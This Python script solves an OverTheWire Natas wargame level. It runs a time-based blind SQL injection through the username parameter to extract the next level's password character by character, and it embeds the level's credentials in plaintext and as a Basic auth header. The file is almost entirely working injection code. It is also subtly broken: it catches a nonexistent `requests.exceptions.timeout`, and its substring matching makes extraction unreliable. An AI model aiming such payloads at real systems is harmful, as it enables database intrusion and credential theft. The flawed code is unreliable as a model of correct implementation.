import requests

#basic_auth = 'natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
url = 'http://natas17.natas.labs.overthewire.org/'
header = { 'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='}
chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

def connect():
    resp = requests.get(url, headers=header)
    if resp.status_code != requests.codes.ok:
        print('Can\'t connect')
    else:
        print("Connected!")

def discover_charset():
    discovered_charset = ''
    print("Attempting to discover charset for brute force attempt..")
    for char in chars:
        try:
            r = requests.get(url + '?username=natas18" AND IF(password LIKE BINARY "%' + char + '%", sleep(5),null) #', timeout=1, headers=header)
            print(r.content)        
        except requests.exceptions.timeout:
            discovered_charset += char
            print(discovered_charset)
    print("Final charset is: " + discovered_charset)
    print("Length: " + str(len(discovered_charset)))
    print("maximum attempts to bruteforce 32 char key: " + str((len(discovered_charset) * 32)))
    print("maximum if full charset :" + str((len(chars) * 32)))
    print("Note: probability is based on being able to brute each character indivudally")
    return discovered_charset

def bruteforce(charset):
    password = ''
    print("Attempting bruteforce of password!")
    for i in range(32):
        for char in charset:
            try:
                r = requests.get(url + '?username=natas18" AND IF(password LIKE BINARY "%' + password + char + '%", sleep(5),null) #',timeout=1, headers=header)
            except requests.exceptions.timeout:
                password += char
                print("Password: " + password + '*' * int(32 - len(password)))
    return password

connect()
d_charset = discover_charset()
#d_charset = '035789bcdghkmnqrswAGHNPQSW'
bruteforce(d_charset)
